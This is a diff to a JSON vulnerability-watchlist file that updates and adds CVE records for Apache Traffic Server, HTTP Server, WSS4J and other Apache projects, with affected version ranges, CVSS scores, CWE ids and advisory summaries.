       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -43089,21 +43444,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43177,7 +43532,7 @@
     },
     {
       "cve_id": "CVE-2026-58178",
-      "description": "The Apache Traffic Server ESI plugin can recurse without bound and fetch attacker-controlled URLs.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "The Apache Traffic Server ESI plugin can recurse without bound and fetch attacker-controlled URLs.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -43187,21 +43542,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43232,7 +43587,7 @@
     },
     {
       "cve_id": "CVE-2026-58179",
-      "description": "The Apache Traffic Server regex_remap plugin overflows the stack and integers from substitution input.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "The Apache Traffic Server regex_remap plugin overflows the stack and integers from substitution input.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 8.1,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
@@ -43242,21 +43597,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43287,7 +43642,7 @@
     },
     {
       "cve_id": "CVE-2026-58180",
-      "description": "The Apache Traffic Server txn_box plugin overflows the stack from attacker-controlled input.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "The Apache Traffic Server txn_box plugin overflows the stack from attacker-controlled input.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -43297,21 +43652,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43342,7 +43697,7 @@
     },
     {
       "cve_id": "CVE-2026-58181",
-      "description": "The Apache Traffic Server uri_signing and url_sig plugins can exhaust the stack or crash on attacker input.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "The Apache Traffic Server uri_signing and url_sig plugins can exhaust the stack or crash on attacker input.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -43352,21 +43707,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43397,7 +43752,7 @@
     },
     {
       "cve_id": "CVE-2026-58182",
-      "description": "The Apache Traffic Server ts_lua plugin mishandles initialization, transform context, and per-instance state.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "The Apache Traffic Server ts_lua plugin mishandles initialization, transform context, and per-instance state.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 8.6,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
@@ -43407,21 +43762,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43452,7 +43807,7 @@
     },
     {
       "cve_id": "CVE-2026-58184",
-      "description": "The Apache Traffic Server header_rewrite plugin can crash or corrupt memory during cookie operations and CIDR condition matching.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "The Apache Traffic Server header_rewrite plugin can crash or corrupt memory during cookie operations and CIDR condition matching.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 8.2,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H",
@@ -43462,21 +43817,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43507,7 +43862,7 @@
     },
     {
       "cve_id": "CVE-2026-58186",
-      "description": "The Apache Traffic Server webp_transform plugin can decode unsafely and serve mislabeled, cacheable responses.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "The Apache Traffic Server webp_transform plugin can decode unsafely and serve mislabeled, cacheable responses.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -43517,21 +43872,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43562,7 +43917,7 @@
     },
     {
       "cve_id": "CVE-2026-58188",
-      "description": "Several Apache Traffic Server experimental plugins have memory-safety and limit-bypass errors.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Several Apache Traffic Server experimental plugins have memory-safety and limit-bypass errors.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 8.2,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
@@ -43572,21 +43927,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -43617,7 +43972,7 @@
     },
     {
       "cve_id": "CVE-2026-58189",
-      "description": "Apache Traffic Server allows redirect-limit bypass when plugins reset the retry counter, enabling SSRF amplification.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server allows redirect-limit bypass when plugins reset the retry counter, enabling SSRF amplification.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -43627,21 +43982,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -44217,6 +44572,49 @@
       }
     },
     {
+      "cve_id": "CVE-2026-59685",
+      "description": "Out-of-bounds Write vulnerability in Apache HTTP Server on Windows while processing paths with 8.3 names that may grow when expanded.\n\n\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-787"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-59739",
       "description": "Information disclosure via SetWatches reconnect replay in Apache ZooKeeper due to missing ACL check.\u00a0An attacker can discover ACL-restricted paths by registering exists-watches on non-existent paths, then reconnecting after the paths are created with restricted ACLs. Issue is caused by incomplete fix for\u00a0CVE-2024-23944 (ZOOKEEPER-4799).\u00a0The fix added ACL checking to WatchManager.triggerWatch(). However, DataTree.setWatches() \u2014 the SetWatches/SetWatches2 reconnect replay handler \u2014 still calls watcher.process(event) with null ACL, bypassing the check entirely. It's important to note that only the path is exposed by this vulnerability, not the data of znode, but since znode path can contain sensitive information like user name or login ID, this issue is potentially critical.\n\nUsers are recommended to upgrade to version 3.9.6, 3.8.7 which fixes the issue.",
       "cvss_score": 7.5,
@@ -44312,6 +44710,49 @@
         ],
         "cpe_count": 2,
         "reference_count": 1
+      }
+    },
+    {
+      "cve_id": "CVE-2026-59797",
+      "description": "Improper Privilege Management vulnerability in Apache HTTP Server's mod_ssl via SSLRequire and file-related expressions.\n\n\n\nThis issue affects Apache HTTP Server: from 2.4.0 through 2.4.68.",
+      "cvss_score": 9.8,
+      "cvss_severity": "CRITICAL",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 9.8,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-269"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
       }
     },
     {
@@ -45630,6 +46071,49 @@
       }
     },
     {
+      "cve_id": "CVE-2026-63045",
+      "description": "Improper validation of FTP PASV reply address in mod_proxy_ftp in Apache Software Foundation Apache HTTP Server through 2.4.68 on all platforms allows, in forward proxy configurations, an untrusted FTP server to cause the proxy to open a data connection to an arbitrary third-party host via a crafted PASV response.\n\nUsers are recommended to upgrade to version 2.4.69, which fixes this issue.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-284"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-63046",
       "description": "Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') vulnerability in Apache InLong.\u00a0Agent Installer's ModuleManager executes arbitrary shell\ncommands via ExcuteLinux.exeCmd() with no filtering or whitelist\nvalidation. \n\nThis issue affects Apache InLong: from 2.0.0 before 2.4.0.\n\n\n\nUsers are advised to upgrade to Apache InLong's  2.4.0 or cherry-pick [1]/[2] to solve it.\n\n[1]\u00a0 https://github.com/apache/inlong/pull/12151 .\n\n[2]\u00a0 https://github.com/apache/inlong/pull/12155 .",
       "cvss_score": 8.8,
@@ -45728,6 +46212,92 @@
       }
     },
     {
+      "cve_id": "CVE-2026-63292",
+      "description": "Stack-based buffer overflow in mod_vhost_alias in Apache Software Foundation Apache HTTP Server through 2.4.68 on all platforms allows a remote client to cause a denial of service or potentially execute arbitrary code via an HTTP request with a Host header exceeding 8192 bytes when VirtualDocumentRoot uses a hostname format specifier and LimitRequestFieldSize is raised above the default.\n\nUsers are recommended to upgrade to version 2.4.69, which fixes this issue.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-121"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-63686",
+      "description": "A NULL pointer dereference in mod_xml2enc in Apache Software Foundation Apache HTTP Server before 2.4.69 on all platforms allows an untrusted backend server to cause a denial of service via a proxied response with a charset whose conversion partially succeeds then fails.\n\nUsers are recommended to upgrade to version 2.4.69, which fixes this issue.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-476"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-63687",
       "description": "Apache CXF's JwtRequestCodeFilter copies all claims from a signed request JWT into the authorization parameter map without excluding security-sensitive parameters. A client that can produce a validly-signed request JWT (e.g., one whose client_secret is known or compromised) can thereby substitute the code_challenge, code_challenge_method, nonce, and state values that were set in the outer HTTP request, undermining PKCE integrity and OpenID Connect replay protection. Users are recommended to upgrade to versions 4.2.3 or 4.1.8 or 3.6.12, which fix this issue.",
       "cvss_score": 9.1,
@@ -45779,6 +46349,49 @@
           "CWE-345"
         ],
         "cpe_count": 3,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-63718",
+      "description": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') response smuggling vulnerability in Apache HTTP Server via mod_proxy_uwsgi and a crafted uwsgi response with Transfer-Encoding.\n\n\n\nThis issue affects Apache HTTP Server: from 2.4.30 through 2.4.68.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.30",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-444"
+        ],
+        "cpe_count": 0,
         "reference_count": 2
       }
     },
@@ -46178,7 +46791,7 @@
     },
     {
       "cve_id": "CVE-2026-65324",
-      "description": "Apache Traffic Server drops the per-stream buffer cap when dechunking HTTP/2 or HTTP/3 responses, letting a slow client exhaust server memory.\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.9, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
+      "description": "Apache Traffic Server drops the per-stream buffer cap when dechunking HTTP/2 or HTTP/3 responses, letting a slow client exhaust server memory.\n\n\n\nThis issue affects Apache Traffic Server: from 8.0.0 through 8.1.11, from 9.0.0 through 9.2.14, from 10.0.0 through 10.1.3.\n\n\n\nUsers are recommended to upgrade to version 9.2.15 or 10.1.4, which fix the issue.",
       "cvss_score": 7.5,
       "cvss_severity": "HIGH",
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
@@ -46188,21 +46801,21 @@
           "product": "apache traffic server",
           "versions": [
             {
-              "lessThanOrEqual": "8.1.9",
               "status": "affected",
               "version": "8.0.0",
+              "lessThanOrEqual": "8.1.11",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "9.2.14",
               "status": "affected",
               "version": "9.0.0",
+              "lessThanOrEqual": "9.2.14",
               "versionType": "semver"
             },
             {
-              "lessThanOrEqual": "10.1.3",
               "status": "affected",
               "version": "10.0.0",
+              "lessThanOrEqual": "10.1.3",
               "versionType": "semver"
             }
           ]
@@ -49539,6 +50152,92 @@
       }
     },
     {
+      "cve_id": "CVE-2026-73636",
+      "description": "Authentication bypass by capture-replay in mod_auth_digest in Apache Software Foundation Apache HTTP Server 2.4.x on all platforms allows a man-in-the-middle (MITM) attacker to replay captured digest authentication credentials via crafted requests that trigger garbage collection of the client's shared memory entry when AuthDigestNonceLifetime is set to 0.\n\nUsers are recommended to upgrade to version 2.4.69, which fixes this issue.",
+      "cvss_score": 8.1,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 8.1,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-294"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-73637",
+      "description": "Use after free in mod_auth_digest in Apache Software Foundation Apache HTTP Server before 2.4.69 on all platforms allows an unauthenticated remote client to cause authentication state corruption via concurrent Digest authentication requests when AuthDigestNcCheck is enabled or AuthDigestNonceLifetime is set to 0.\n\nUsers are recommended to upgrade to version 2.4.69, which fixes this issue.",
+      "cvss_score": 7.3,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache http server",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "2.4.0",
+              "lessThanOrEqual": "2.4.68",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache http server",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": null,
+      "nvd": {
+        "cvss_v3_score": 7.3,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-416"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
+    },
+    {
       "cve_id": "CVE-2026-73668",
       "description": "Incorrect Authorization vulnerability in Apache Syncope.\n\n\n\n\n\nAn administrator with adequate entitlements in a given Realm may be able to read via REST the full Connector configuration, confidential properties included, scoped in another Realm and thus be able to effectively duplicate such Connector instance into the Realm they have administration rights for.\n\nThis issue affects Apache Syncope: from 3.0.0-M0 through 3.0.16, from 4.0.0-M0 Through 4.0.7, from 4.1.0-M0 through 4.1.2.\n\n\nUsers are recommended to upgrade to version 4.0.8 / 4.1.3, which fix this issue.",
       "cvss_score": 9.8,
@@ -50399,7 +51098,18 @@
         "vendor:apache software foundation"
       ],
       "active_threat": false,
-      "probability_score": 0.00505
+      "probability_score": 0.00505,
+      "nvd": {
+        "cvss_v3_score": 9.1,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-305"
+        ],
+        "cpe_count": 0,
+        "reference_count": 2
+      }
     },
     {
       "cve_id": "CVE-2026-77762",
@@ -52489,6 +53199,61 @@
       }
     },
     {
+      "cve_id": "CVE-2026-85532",
+      "description": "Apache WSS4J accepted attacker-controlled derived-key lengths and offsets without adequate bounds. This could permit cryptographically weak keys or excessive CPU and memory consumption when processing crafted WS-Security messages. The fixes enforce a minimum key length of 16 bytes, a maximum length of 512 bytes, and a maximum offset of 4096 bytes.\nUsers are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4, which fix this issue.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache wss4j",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "4.0.0",
+              "lessThan": "4.0.2",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "3.0.0",
+              "lessThan": "3.0.6",
+              "versionType": "semver"
+            },
+            {
+              "status": "affected",
+              "version": "0",
+              "lessThan": "2.4.4",
+              "versionType": "semver"
+            }
+          ]
+        }
